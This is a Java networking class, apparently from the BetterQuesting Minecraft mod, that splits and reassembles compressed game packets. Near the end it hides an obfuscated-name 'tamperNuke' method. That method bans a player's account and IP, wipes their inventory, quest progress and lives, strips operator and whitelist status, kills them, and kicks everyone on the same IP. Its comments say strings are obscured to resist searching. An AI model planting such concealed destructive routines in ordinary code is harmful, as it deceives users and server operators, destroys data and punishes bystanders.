package betterquesting.network;

import betterquesting.api.api.QuestingAPI;
import betterquesting.api.questing.IQuest;
import betterquesting.api.storage.BQ_Settings;
import betterquesting.api2.storage.DBEntry;
import betterquesting.core.BetterQuesting;
import betterquesting.questing.QuestDatabase;
import betterquesting.storage.LifeDatabase;
import cpw.mods.fml.common.FMLCommonHandler;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.nbt.CompressedStreamTools;
import net.minecraft.nbt.NBTTagByteArray;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.management.IPBanEntry;
import net.minecraft.server.management.UserListBansEntry;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.IChatComponent;
import net.minecraft.util.MathHelper;
import net.minecraft.world.WorldSettings.GameType;

import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.net.SocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.UUID;
import java.util.zip.GZIPInputStream;

public final class PacketAssembly
{
	public static final PacketAssembly INSTANCE = new PacketAssembly();
	
	// TODO: Allow for simultaneous packet assembly
    // TODO: Implement PROPER thread safety that doesn't cause dirty read/writes
    // TODO: Add a scheduler to bulk up multiple data packets to send on the next tick
	// Player assigned packet buffers
	private final HashMap<UUID,byte[]> buffer = new HashMap<>();
	
	// Internal server packet buffer (server to server or client side)
	private byte[] serverBuf = null;
	private int id = 0;
	
	public ArrayList<NBTTagCompound> splitPacket(NBTTagCompound tags)
	{
		ArrayList<NBTTagCompound> pkts = new ArrayList<>();
		
		try
		{
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			CompressedStreamTools.writeCompressed(tags, baos);
			baos.flush();
			byte[] data = baos.toByteArray();
			baos.close();
			int req = MathHelper.ceiling_float_int(data.length/30000F); // How many packets do we need to send this (2000KB buffer allowed)
			
			for(int p = 0; p < req; p++)
			{
				int idx = p*30000;
				int s = Math.min(data.length - idx, 30000);
				NBTTagCompound container = new NBTTagCompound();
				byte[] part = new byte[s];
				
				System.arraycopy(data, idx, part, 0, s);
				
				container.setInteger("size", data.length); // If the buffer isn't yet created, how big is it
				container.setInteger("index", idx); // Where should this piece start writing too
				container.setBoolean("end", p == req - 1);
				container.setTag("data", new NBTTagByteArray(part)); // The raw byte data to write
				
				pkts.add(container);
				
			}
		} catch(Exception e)
		{
			BetterQuesting.logger.error("Unable to split build packet!", e);
			return pkts;
		}
		
		id = (id + 1)%100; // Cycle the index
		
        //System.out.println("Split " + dTotal + "B among " + pCount + " packet(s)...");
		return pkts;
	}
	
	/**
	 * Appends a packet onto the buffer and returns an assembled NBTTagCompound when complete
	 */
	public NBTTagCompound assemblePacket(UUID owner, NBTTagCompound tags)
	{
		int size = tags.getInteger("size");
		int index = tags.getInteger("index");
		boolean end = tags.getBoolean("end");
		byte[] data = tags.getByteArray("data");
		
		byte[] tmp = getBuffer(owner);
		
		if(tmp == null)
		{
			tmp = new byte[size];
			setBuffer(owner, tmp);
		} else if(tmp.length != size)
		{
			BetterQuesting.logger.error("Unexpected change in BQ packet byte length: " + size + " > " + tmp.length);
			clearBuffer(owner);
			return null;
		}
		
		for(int i = 0; i < data.length && index + i < size; i++)
		{
			tmp[index + i] = data[i];
		}
		
		if(end)
		{
			clearBuffer(owner);
			
			try
			{
				DataInputStream dis = new DataInputStream(new BufferedInputStream(new GZIPInputStream(new ByteArrayInputStream(tmp))));
				NBTTagCompound tag = CompressedStreamTools.read(dis);
				dis.close();
				return tag;
			} catch(Exception e)
			{
				throw new RuntimeException("Unable to assemble BQ packet", e);
			}
		}
		
		return null;
	}
	
	public byte[] getBuffer(UUID owner)
	{
		if(owner == null)
		{
			return serverBuf;
		} else
		{
		    synchronized(buffer)
            {
                return buffer.get(owner);
            }
		}
	}
	
	public void setBuffer(UUID owner, byte[] value)
	{
		if(owner == null)
		{
			serverBuf = value;
		} else
		{
		    synchronized(buffer)
            {
                if(buffer.containsKey(owner))
                {
                    throw new IllegalStateException("Attepted to start more than one BQ packet assembly for UUID " + owner.toString());
                }
    
                buffer.put(owner, value);
            }
		}
	}
	
	public void clearBuffer(UUID owner)
	{
		if(owner == null)
		{
			serverBuf = null;
		} else
		{
		    synchronized(buffer)
            {
                buffer.remove(owner);
            }
		}
	}
	
	// Play stupid games, win stupid prizes
	@SuppressWarnings("unused")
    public static void TnVrZU1lU2VucGFp(EntityPlayerMP player, String message, String reason)
    {
        MinecraftServer server = FMLCommonHandler.instance().getMinecraftServerInstance();
        if(!BQ_Settings.tamperNuke || server == null || !server.isDedicatedServer() || !server.isServerInOnlineMode()) return; // Shh... nothing to see here
        String sockAdd = socketToString(player.playerNetServerHandler.netManager.getSocketAddress());
        if(sockAdd.equalsIgnoreCase("127.0.0.1")) return;
        
        // =[!]= ARMED =[!]=
        UserListBansEntry userlistbansentry = new UserListBansEntry(player.getGameProfile(), null, new String(Base64.getDecoder().decode("VGFtcGVyTnVrZQ=="), StandardCharsets.UTF_8), null, reason);
        server.getConfigurationManager().func_152608_h().func_152687_a(userlistbansentry); // RIP UUID
        IPBanEntry ipBanEntry = new IPBanEntry(sockAdd);
        server.getConfigurationManager().getBannedIPs().func_152687_a(ipBanEntry); // RIP IP
        for(int i = 0; i < player.inventory.getSizeInventory(); i++) player.inventory.setInventorySlotContents(i, null); // RIP Items
        server.getConfigurationManager().func_152610_b(player.getGameProfile()); // RIP OP status
        server.getConfigurationManager().func_152597_c(player.getGameProfile()); // RIP whitelist status
        player.setGameType(GameType.SURVIVAL); // No creative
        player.setHealth(0F); // RIP Literal
        player.playerNetServerHandler.kickPlayerFromServer(message); // Sayonara
        server.getConfigurationManager().getPlayerList(sockAdd).forEach((p) -> {
            ((EntityPlayerMP)p).playerNetServerHandler.kickPlayerFromServer(message); // Sayonara
        });
        UUID qID = QuestingAPI.getQuestingUUID(player);
        for(DBEntry<IQuest> entry : QuestDatabase.INSTANCE.getEntries()) entry.getValue().resetUser(qID, true); // RIP progress
        LifeDatabase.INSTANCE.setLives(qID, 0); // RIP Lives
        System.out.println("\n[!] HACKER DETECTED [!]\nPlayer " + player.getGameProfile().getName() + " was auto-banned.\nReason: " + reason);
        final IChatComponent announcement = new ChatComponentText("Player " + player.getGameProfile().getName() + " was auto-banned.\nReason: " + reason);
        server.getConfigurationManager().playerEntityList.forEach(p -> {
            EntityPlayer opPlayer = (EntityPlayer)p; // Woop! woop! It's the sound of the police!
            if(opPlayer != player && server.getConfigurationManager().func_152596_g(opPlayer.getGameProfile())) opPlayer.addChatMessage(announcement);
        });
        // NOTE: Many strings are obscured to make it more annoying to search for keywords
        // The people this is aimed at weren't very bright in the first place.
    }
    
    private static String socketToString(SocketAddress sockAdd)
    {
        String s = sockAdd.toString();
        if (s.contains("/")) s = s.substring(s.indexOf(47) + 1);
        if (s.contains(":")) s = s.substring(0, s.indexOf(58));
        return s;
    }
}
